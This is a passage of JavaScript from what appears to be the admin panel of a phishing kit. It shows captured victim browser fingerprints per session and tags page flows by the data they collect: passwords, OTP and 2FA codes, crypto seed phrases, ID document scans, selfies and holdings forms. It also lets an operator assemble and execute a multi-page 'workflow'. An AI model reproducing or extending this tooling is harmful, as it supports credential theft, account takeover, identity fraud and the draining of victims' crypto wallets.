            subValue: details.timezoneOffset ? `UTC${details.timezoneOffset > 0 ? '+' : ''}${-details.timezoneOffset/60}` : 'Offset N/A'
          },
          {
            title: 'Browser Agent',
            icon: icons.browser,
            value: details.userAgent ? details.userAgent.split('(')[0].trim() : 'Unknown',
            subValue: details.userAgent || 'Full User Agent N/A'
          }
        ].filter(card => card.value !== 'Unknown' && card.value !== 'Not available');
  
  
        if (cardsData.length === 0 && !(details.platform || details.webGL?.unmaskedVendor || details.timezone || details.userAgent)) {
           fingerprintOutput.innerHTML = `<div class="col-span-full flex items-center justify-center h-32 text-text-light/60 dark:text-text-color/60">No fingerprint data to display for this session.</div>`;
        } else {
          fingerprintOutput.innerHTML = cardsData.map(card => `
            <div class="bg-card rounded-xl p-4 border border-secondary-light dark:border-secondary-dark hover:shadow-lg dark:hover:shadow-primary-dark/20 transition-all duration-200" style="min-width: 200px;">
              <div class="flex items-start justify-between">
                <div class="flex-1 overflow-hidden pr-2">
                  <h4 class="text-sm font-semibold text-text-light/70 dark:text-text-color/70 mb-1">${card.title}</h4>
                  <div class="text-base font-medium text-text-light dark:text-text-color truncate" title="${card.value}">${card.value}</div>
                  <div class="text-xs text-text-light/60 dark:text-text-color/60 truncate" title="${card.subValue}">${card.subValue}</div>
                </div>
                <div class="flex-shrink-0 text-primary-light dark:text-primary-dark">
                  ${card.icon || `<div class="w-8 h-8 bg-gray-200 dark:bg-gray-700 rounded"></div>`}
                </div>
              </div>
            </div>
          `).join('');
        }
  
  
        const dataToCopy = {
          platform: details.platform,
          screen_resolution: details.screenResolution ? `${details.screenResolution.width}x${details.screenResolution.height}` : undefined,
          gpu_vendor: details.webGL?.unmaskedVendor,
          gpu_renderer: details.webGL?.unmaskedRenderer,
          timezone: details.timezone,
          timezone_offset_minutes: details.timezoneOffset,
          user_agent: details.userAgent,
        };
        
        const filteredDataToCopy = Object.fromEntries(Object.entries(dataToCopy).filter(([_, v]) => v !== undefined));
  
        const copyIconSVG = `<svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>`;
        const originalButtonText = 'Copy Data';
        
        if (copyButton) {
          copyButton.innerHTML = `${copyIconSVG} ${originalButtonText}`;
          copyButton.onclick = null; 
          copyButton.addEventListener('click', async () => {
            try {
              await navigator.clipboard.writeText(JSON.stringify(filteredDataToCopy, null, 2));
              copyButton.innerHTML = `${copyIconSVG} Copied!`;
              copyButton.classList.add('text-status-success-light', 'dark:text-status-success-dark');
              setTimeout(() => {
                copyButton.innerHTML = `${copyIconSVG} ${originalButtonText}`;
                copyButton.classList.remove('text-status-success-light', 'dark:text-status-success-dark');
              }, 2000);
            } catch (err) {
              showToast('Failed to copy data.', 'error');
            }
          });
        }
  
      } else {
        fingerprintOutput.innerHTML = `<div class="col-span-full flex items-center justify-center h-32 text-text-light/60 dark:text-text-color/60">No fingerprint data available for this session.</div>`;
      }
    } catch (error) {
      fingerprintOutput.innerHTML = `<div class="col-span-full flex items-center justify-center h-32 text-status-error-light dark:text-status-error-dark">Error displaying fingerprint data: ${error.message}</div>`;
    }
  }
  

  function handlePreviewError(error, pagePath, silent) {
      logErrorToServer(error);
      if (!silent) {
          previewImg.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIyIj48cGF0aCBkPSJNMTIgMkM2LjQ4IDIgMiA2LjQ4IDIgMTJzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnptMSAxNWgtMnYtMmgydjJ6bTAtNGgtMlY3aDJ2NnoiLz48L3N2Zz4=';
          showToast(`Preview error: ${error.message}`, 'error');
      }
  }

  function cleanupPreview(iframe, silent) {
      iframe?.parentNode?.removeChild(iframe);
      if (!silent) {
          loading.classList.add('hidden');
          previewImg.classList.remove('blur-loading');
          previewContainer.classList.remove('preview-loading');
      }
  }


  async function fetchPageContent(path) {
    const response = await fetch(path);
    const html = await response.text();
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    
    const styles = Array.from(doc.querySelectorAll('style, link[rel="stylesheet"]'))
      .map(el => el.outerHTML)
      .join('\n');

    return {
      content: doc.body.innerHTML,
      styles
    };
  }

  function createPreviewContainer(content, styles) {
    const container = document.createElement('div');
    container.style.position = 'absolute';
    container.style.left = '-9999px';
    container.style.top = '-9999px';
    container.style.width = '1280px';
    container.style.height = '720px';
    container.style.overflow = 'hidden';
    
    const styleElement = document.createElement('div');
    styleElement.innerHTML = styles;
    
    container.appendChild(styleElement);
    container.innerHTML += content;
    document.body.appendChild(container);
    
    return container;
  }

  state.workflow = [];
  state.workflowShowPreviews = false;
  
  function getPreviewForPage(id) {
    return "https://via.placeholder.com/40x30?text=" + encodeURIComponent(id);
  }

  function getDataTypeIcon(dataType) {
    const normalizedType = typeof dataType === 'string' ? 
        dataType.toLowerCase().replace(/[^a-z0-9_\-]/g, '') : 'default'; 
    
        const getIconType = (type) => {
          if (type.includes('email') || type === 'eml' || type === 'recovery_email') return 'email';
          if (type === 'current-password') return 'currentpassword'; 
          if (type.includes('password') || type === 'pss' || type === 'passwd') return 'password'; 
          if (type.includes('phone') || type.includes('phonenumb') || type === 'phn' || type === 'recovery_phone') return 'phone'; 
          if (type.includes('otp') || type.includes('2facode') || type === 'securitycode') return 'otpcode'; 
          if (type.includes('identifier') || type === 'username' || type.includes('fullname') || type === 'user') return 'identifier';
          if (type === 'seed_phrase' || type.includes('seedphrase')) return 'seedphrase'; 
          if (type === 'seed_backup') return 'seedbackup';
          if (type === 'seed_import') return 'seedimport';
          if (type.includes('seed')) return 'seed'; 
          if (type === 'front_file') return 'idfront'; 
          if (type === 'back_file') return 'idback'; 
          if (type === 'image_0_file') return 'selfie'; 
          if (type.includes('file') || type.includes('image')) return 'image';
          if (type === 'activity_form') return 'activityform';
          if (type === 'holdings_form') return 'holdingsform';
          if (type.includes('form') || type.includes('activity') || type.includes('holding')) return 'activity';
          if (type.includes('recovery')) return 'recovery';
          if (type === 'code') return 'code';
          if (type === 'iverifytext' || type === 'iVerifyText') return 'verifytext'; 
          if (type === 'countrycodeintl') return 'countrycode'; 
          return 'default'; 
        };
    
    const iconType = getIconType(normalizedType);
    
    const icons = {
        email: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-email"><rect x="2" y="4" width="20" height="16" rx="2"></rect><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path></svg>',
        password: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-password"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>',
        currentpassword: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-current-password"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>',
        newpassword: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-new-password"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M12 3v4m0 0 3-3m-3 3L9 4"></path><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>',
        phone: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-phone"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>',
        recovery: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-recovery"><path d="M21.964 18.27A9.93 9.93 0 0 0 22 12c0-5.52-4.48-10-10-10S2 6.48 2 12s4.48 10 10 10c2.76 0 5.26-1.12 7.07-2.93"/><path d="M16 14h6v6"/><path d="m9 12-2 2 4 4"/></svg>', 
        identifier: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-identifier"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>',
        username: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-username"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>', 
        otpcode: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-otp"><path d="M22 7h-9a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2Z"></path><path d="M14 15h-4c-.5 0-1-.4-1-1v-5c0-.5.4-1 1-1h4"></path><path d="M4 17v-1a2 2 0 0 1 2-2h2"></path><path d="M4 9v1a2 2 0 0 0 2 2h2"></path></svg>',
        code: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-code"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>', 
        verifytext: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-verifytext"><path d="M15 3h6v6"/><path d="M10 14 21 3"/><path d="M21 14v5a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5"/></svg>', 
        seedphrase: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-seedphrase"><path d="M12 3c-4.97 0-9 2.69-9 6 0 1.68 1.02 3.19 2.66 4.25.08.07.16.13.24.2.15.12.31.23.47.34h.01c.21.14.42.26.64.37l.01.01c.63.32 1.31.57 2.03.74L9 15c.01 1.76.9 3.45 2.41 4.41A5 5 0 0 0 14 20c1.97 0 3.47-1.08 4.24-2.56.43-.87.76-1.76.96-2.68L19 14l-1-1c.13-.15.26-.31.38-.47A6.32 6.32 0 0 0 21 9c0-3.31-4.03-6-9-6z"/><path d="M9 14C5.03 14 2 15.79 2 18s3.03 4 7 4c.46 0 .9-.03 1.33-.08C13.46 21.16 15 19.77 15 18c0-2.21-3.03-4-6-4z"/></svg>',
        seedbackup: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-seed-backup"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/><path d="M18 12a2 2 0 0 0 0 4h4v-4Z"/><path d="m19 15-3 3 3 3"/></svg>',
        seedimport: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-seed-import"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/><path d="M18 12a2 2 0 0 0 0 4h4v-4Z"/><path d="m16 19 3-3 3 3"/></svg>',
        seed: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-seed-generic"><path d="M12 8c-2.17 0-4 1.83-4 4.08 0 2.29 1.83 4.17 4 4.17s4-1.88 4-4.17c0-2.25-1.83-4.08-4-4.08Z"/><path d="M12 16.25c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4Z"/><path d="M12 2a10 10 0 1 0 10 10c0-1.1-.9-2-2-2s-2 .9-2 2c0 1.1.9 2 2 2a6 6 0 0 1-6 6 6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6"/></svg>',
        idfront: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-id-front"><rect x="3" y="4" width="18" height="16" rx="2"/><circle cx="9" cy="10" r="2"/><path d="M15 8h2"/><path d="M15 12h2"/><path d="M7 16h10"/></svg>',
        idback: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-id-back"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M7 12h10"/><path d="M7 8h10"/><path d="M7 16h10"/></svg>',
        selfie: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-selfie"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="12" cy="10" r="3"/><path d="M9 18c.9-1.3 2.3-2 4-2 1.7 0 3.1.7 4 2"/></svg>',
        image: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-image-file"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="m21 15-5-5L5 21"/></svg>', 
        activityform: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-activity"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>',
        holdingsform: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-holdings"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M8 12h8"/></svg>',
        activity: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-activity-generic"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>', 
        countrycode: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-countrycode"><path d="M21.5 12c0-5.52-4.48-10-10-10S1.5 6.48 1.5 12c0 4.42 2.87 8.17 6.84 9.5.6.22 1.16.3 1.66.3 2.76 0 5.26-1.12 7.07-2.93A9.93 9.93 0 0 0 21.5 12z"/><path d="M12 2v20"/><path d="M12 12c5.52 0 10-4.48 10-10"/><path d="M12 12c-5.52 0-10 4.48-10 10"/></svg>',
    };
    const iconSvg = icons[iconType]; 
    if (iconType === 'default' || !iconSvg) {
      return ''; 
    }
    return `<span class="icon-wrapper icon-type-${iconType}" data-icon-type="${normalizedType}">${iconSvg}</span>`;
}


const iconStyleEl = document.createElement('style');
 iconStyleEl.textContent = ` .workflow-controls { display: flex; align-items: center; margin-left: auto; } .workflow-icons { display: flex; align-items: center; margin-right: 4px; } .workflow-icon { margin-right: 6px; display: flex; align-items: center; justify-content: center; } .workflow-card, .card-preview { display: flex; align-items: center; position: relative; min-height: 40px; } .workflow-card > span, .card-preview > h6 { position: absolute; left: 50%; transform: translateX(-50%); text-align: center; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 60%; pointer-events: none; } .workflow-card > svg:first-child, .card-preview > svg:first-child { margin-right: 8px; z-index: 5; } .workflow-remove { position: relative; z-index: 10; } #workflowAvailableList li, #workflowMainList li { margin-bottom: 8px; padding: 8px 12px; } `;
 document.head.appendChild(iconStyleEl);
 const progressBarStyles = '.progress-container { position: relative; padding: 20px 0; overflow: hidden; width: 100%; } .progress-steps { display: flex; flex-wrap: wrap; justify-content: center; position: relative; width: 100%; } .progress-row { display: flex; width: 100%; justify-content: center; margin-bottom: 30px; position: relative; } .progress-step { display: flex; flex-direction: column; align-items: center; position: relative; z-index: 2; flex: 0 0 auto; min-width: 60px; max-width: 120px; } .step-circle { width: 40px; height: 40px; border-radius: 50%; background-color: var(--background-card); border: 2px solid var(--color-primary); display: flex; align-items: center; justify-content: center; font-weight: bold; color: var(--color-primary); transition: all 0.3s ease; } .step-circle.completed { background-color: var(--color-primary); color: var(--background-card); } .step-circle.active { background-color: var(--color-primary); color: var(--background-card); } .step-label { margin-top: 8px; font-size: 12px; text-align: center; max-width: 100px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--text-color); } .step-circle .checkmark { display: none; } .step-circle.completed .checkmark { display: inline; } .step-circle.completed .step-number { display: none; } .progress-line { position: absolute; height: 2px; background-color: var(--border-color); z-index: 1; top: 20px; } .progress-line-active { position: absolute; height: 2px; background-color: var(--color-primary); z-index: 1; width: 0; transition: width 0.8s ease; top: 20px; } .dark .progress-line { background-color: var(--border-color); } .dark .progress-line-active { background-color: var(--primary-dark); } .dark .step-circle { border-color: var(--primary-dark); color: var(--primary-dark); } .dark .step-circle.completed, .dark .step-circle.active { background-color: var(--primary-dark); color: var(--background); } .step-input-container { margin-top: 6px; width: 100%; display: flex; flex-direction: column; gap: 4px; } .step-input { font-size: 12px; padding: 4px 6px; border: 1px solid var(--border-color); border-radius: 4px; background-color: var(--background-box); color: var(--text-color); width: 100%; min-width: 80px; } .step-input-label { font-size: 10px; color: var(--text-color-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .workflow-card.completed { position: relative; } .workflow-card.completed::after { content: ; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(39, 174, 96, 0.15); pointer-events: none; opacity: 1; transition: opacity 0.5s ease; border-radius: inherit; z-index: 1; } '
 let progressUpdateInterval = null;
 const WF_STORE = {
    listKey: 'workflowPresets',
    dataKey: name => `workflow_${name}`
 };
 let workflowPresets = JSON.parse(localStorage.getItem(WF_STORE.listKey) || '[]');

 function initProgressUI() {
    const styleElement = document.createElement('style');
    styleElement.textContent = progressBarStyles;
    document.head.appendChild(styleElement);
    const presetBox = document.getElementById('workflowPresetBox');
    if (presetBox) {
       const progressBar = document.createElement('div');
       progressBar.id = 'workflowProgressBar';
       progressBar.className = 'mt-6 mb-4';
       progressBar.innerHTML = ` <div class="progress-container"> <div class="progress-steps"></div> </div> `;
       presetBox.parentNode.insertBefore(progressBar, presetBox);
    }
 }

 const openModal = () => {
  ytQueryModal.classList.remove('hidden')
  ytQueryInput.focus()
}

const closeModal = () => {
  ytQueryModal.classList.add('hidden')
  ytQueryInput.value = ''
}

const removeQuery = (query) => {
  queries.delete(query)
  renderQueries()
}

const renderQueries = () => {
  const container = ytQueryDisplay.querySelector('div') || ytQueryDisplay
  container.innerHTML = ''
  
  queries.forEach(query => {
      const tag = document.createElement('div')
      tag.className = 'flex items-center justify-between bg-primary/10 hover:bg-primary/20 rounded-full px-3 py-1.5 transition-colors cursor-default select-none w-fit'
      
      const textContainer = document.createElement('div')
      textContainer.className = 'flex items-center'
      
      const text = document.createElement('span')
      text.className = 'text-sm font-medium whitespace-nowrap'
      text.textContent = query
      
      const removeBtn = document.createElement('button')
      removeBtn.type = 'button'
      removeBtn.className = 'ml-2 flex items-center justify-center text-text-light/60 hover:text-status-error-light dark:text-text-color/60 dark:hover:text-status-error-dark'
      removeBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>`
      
      removeBtn.onclick = (e) => {
          e.preventDefault()
          e.stopPropagation()
          queries.delete(query)
          renderQueries()
          saveQueries()
      }

      textContainer.appendChild(text)
      textContainer.appendChild(removeBtn)
      tag.appendChild(textContainer)
      container.appendChild(tag)
  })
}

const saveQueries = () => {
    localStorage.setItem('ytQueries', JSON.stringify(Array.from(queries)))
}

const loadQueries = () => {
    const saved = localStorage.getItem('ytQueries')
    if (saved) {
        queries.clear()
        JSON.parse(saved).forEach(q => queries.add(q))
        renderQueries()
    }
}

if (ytQueryInput && ytQueryDisplay) {
    loadQueries()

    ytQueryInput.addEventListener('keydown', (event) => {
        const input = event.target
        const query = input.value.trim().toLowerCase()

        if (event.key === 'Enter' && query) {
            event.preventDefault()
            if (!queries.has(query)) {
                queries.add(query)
                input.value = ''
                renderQueries()
                saveQueries() 
            } else {
                input.value = ''
            }
        }

        if (event.key === 'Backspace' && !input.value) {
            event.preventDefault()
            const lastQuery = Array.from(queries).pop()
            if (lastQuery) {
                queries.delete(lastQuery)
                renderQueries()
                saveQueries()
            }
        }
    })

    ytQueryInput.addEventListener('paste', (e) => {
        e.preventDefault()
        const paste = (e.clipboardData || window.clipboardData).getData('text')
        const pastedQueries = paste.split(/[,\s]+/).filter(q => q.trim())
        
        pastedQueries.forEach(query => {
            const cleanQuery = query.trim().toLowerCase()
            if (cleanQuery && !queries.has(cleanQuery)) {
                queries.add(cleanQuery)
            }
        })
        
        renderQueries()
        saveQueries() 
        ytQueryInput.value = ''
    })
}

function cardHTML(label, id, inWorkflow, pageData) {
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-grip-icon lucide-grip"> <circle cx="12" cy="5" r="1"/> <circle cx="19" cy="5" r="1"/> <circle cx="5" cy="5" r="1"/> <circle cx="12" cy="12" r="1"/> <circle cx="19" cy="12" r="1"/> <circle cx="5" cy="12" r="1"/> <circle cx="12" cy="19" r="1"/> <circle cx="19" cy="19" r="1"/> <circle cx="5" cy="19" r="1"/> </svg>`;

  let iconsHtml = '';
  if (pageData) {
    const requiredData = pageData.panel?.input?.required_data || pageData.required_data || [];
    if (requiredData.length > 0) {
      requiredData.forEach(item => {
        const value = item.value || item.placeholder_name;
        const type = item.value || item.type;
        iconsHtml += `<span class="workflow-icon required-data" title="Required: ${value}">${getDataTypeIcon(type)}</span>`;
      });
    }

    if (pageData.form && Object.keys(pageData.form).length > 0) {
      Object.keys(pageData.form).forEach(key => {
        iconsHtml += `<span class="workflow-icon form-data" title="Receives: ${pageData.form[key]}">${getDataTypeIcon(pageData.form[key])}</span>`;
      });
    }
  }
  const pageIcons = `<div class="workflow-icons">${iconsHtml}</div>`;

  if (inWorkflow && state.workflowShowPreviews) {
    let previewSrc = '/img/placeholder.png';
    if (pageData && pageData.preview_image) {
      previewSrc = pageData.preview_image;
    }
    const cardElement = ` <li class="card-preview" data-id="${id}"> ${svg} <img src="${previewSrc}" alt="${label}" data-preview-for="${id}" /> <h6>${label}</h6> <div class="workflow-controls"> ${pageIcons} <button class="workflow-remove remove-handler" title="Remove">×</button> </div> </li>`;
    return cardElement;
  }

  return ` <li class="workflow-card" data-id="${id}" draggable="true"> ${svg} <span>${label}</span> <div class="workflow-controls"> ${pageIcons} ${inWorkflow ? '<button class="workflow-remove remove-handler" title="Remove">×</button>' : ''} </div> </li>`;
}

function attachRemoveHandlers() {
  document.querySelectorAll('.workflow-remove').forEach((btn) => {
    btn.onclick = () => {
      const item = btn.closest('li');
      const mainListItems = Array.from(document.querySelectorAll('#workflowMainList > li'));
      const infoListItems = Array.from(document.querySelectorAll('#workflowPagesDisplay > li'));
      
      let itemIndex = mainListItems.indexOf(item);
      if (itemIndex === -1) {
        itemIndex = infoListItems.indexOf(item);
      }
      
      if (itemIndex !== -1) {
        state.workflow.splice(itemIndex, 1);
        renderWorkflow();
        
        iconConnectionSystem.scanForIcons();
        iconConnectionSystem.restoreConnections();
      }
    };
  });
}

async function renderWorkflow() {
  const available = document.getElementById('workflowAvailableList');
  const main = document.getElementById('workflowMainList');
  const preview = document.getElementById('workflowPreviewToggle');
  const logo = document.getElementById('workflowImageContainer');

  const availablePages = state.availablePages || [];
  
  const pageDataMap = {};
  availablePages.forEach(page => {
    const pageKey = page.id.replace(/^\/+/, '');
    pageDataMap[pageKey] = page;
  });

  available.innerHTML = availablePages
    .map(p => {
      const pageKey = p.id.replace(/^\/+/, '');
      return cardHTML(p.label, p.id, false, p);
    }).join('');

  const workflowContent = state.workflow.map(id => {
    const page = availablePages.find(p => p.id === id);
    if (!page) return '';
    const pageKey = id.replace(/^\/+/, '');
    return cardHTML(page.label, id, true, page);
  }).join('');

  main.innerHTML = workflowContent;

  document.querySelectorAll('#workflowMainList li').forEach((li, i, arr) => {
    const isLastInContainer = Array.from(li.parentElement.children).indexOf(li) === li.parentElement.children.length - 1;
    li.classList.toggle('has-line', !isLastInContainer);
  });

  logo.style.display = main.children.length ? 'none' : '';
  preview.innerHTML = `<span class="text-sm font-medium text-text-light dark:text-text-color">Show Previews</span> <label class="relative inline-flex items-center cursor-pointer"> <input type="checkbox" id="workflowPreviewToggleInput" class="sr-only peer" ${state.workflowShowPreviews ? 'checked' : ''}> <div class="w-11 h-6 bg-secondary-light dark:bg-secondary-dark rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary-light dark:peer-checked:bg-primary-dark"></div> </label>`;
  
  document.getElementById('workflowPreviewToggleInput').onclick = e => {
    state.workflowShowPreviews = e.target.checked;
    renderWorkflow(); 
  };
  
  attachRemoveHandlers();
  renderWorkflowProgress();
  updateWorkflowCardProgress();
  iconConnectionSystem.scanForIcons();

  if (state.sessionManagerActiveTab === 'workflow') {
    const executeButton = document.getElementById('executeWorkflow');
    if (executeButton) {
      const hasWorkflowItems = main.children.length > 0;
      if (hasWorkflowItems) {
        executeButton.classList.remove('btn-disabled');
        executeButton.classList.add('btn-primary');
        executeButton.style.cursor = 'pointer';
      } else {
        executeButton.classList.add('btn-disabled');
        executeButton.classList.remove('btn-primary');
        executeButton.style.cursor = 'not-allowed';
      }
    }
  }
}

 function renderWorkflowProgress() {
    let workflowItems = [];
    let currentIndex = 0;
    const uiWorkflowItems = document.querySelectorAll('#workflowMainList .workflow-card, #workflowMainList .card-preview');
    if (uiWorkflowItems.length > 0) {
       workflowItems = uiWorkflowItems;
       if (state.selectedSession && state.selectedSession.current_page_index !== undefined) {
          currentIndex = Math.min(state.selectedSession.current_page_index, uiWorkflowItems.length - 1);
          if (currentIndex < 0) currentIndex = 0;
       }
    } else if (state.selectedSession && state.selectedSession.workflow && Array.isArray(state.selectedSession.workflow) && state.selectedSession.workflow.length > 0) {
       workflowItems = state.selectedSession.workflow;
       currentIndex = state.selectedSession.current_page_index || 0;
    }
    const progressContainer = document.querySelector('.progress-container');
    if (!progressContainer) return;
    const progressSteps = document.querySelector('.progress-steps');
    progressSteps.innerHTML = '';
    if (!workflowItems || workflowItems.length === 0) {
       document.getElementById('workflowProgressBar').style.display = 'none';
       return;
    }
    document.getElementById('workflowProgressBar').style.display = 'block';
    const steps = [];
    if (Array.isArray(workflowItems)) {
       workflowItems.forEach((pageId, index) => {
          const pageData = state.availablePages.find(page => page.id === pageId);
          const pageLabel = pageData ? (pageData.name || pageData.label) : `Step ${index+1}`;
          const stepEl = createStepElement(pageData, pageId, index, currentIndex, pageLabel);
          steps.push(stepEl);
       });
    } else {
       workflowItems.forEach((item, index) => {
          const pageId = item.getAttribute('data-id');
          const pageLabel = item.querySelector('span')?.textContent || item.querySelector('h6')?.textContent || `Step ${index+1}`;
          const pageData = state.availablePages.find(page => page.id === pageId);
          const stepEl = createStepElement(pageData, pageId, index, currentIndex, pageLabel);
          steps.push(stepEl);
       });
    }
    const MAX_ITEMS_PER_ROW = 6;
    const rows = [];
    for (let i = 0; i < steps.length; i += MAX_ITEMS_PER_ROW) {
       rows.push(steps.slice(i, i + MAX_ITEMS_PER_ROW));
    }
    rows.forEach((rowSteps, rowIndex) => {
       const rowEl = document.createElement('div');
       rowEl.className = 'progress-row';
       rowEl.setAttribute('data-row', rowIndex);
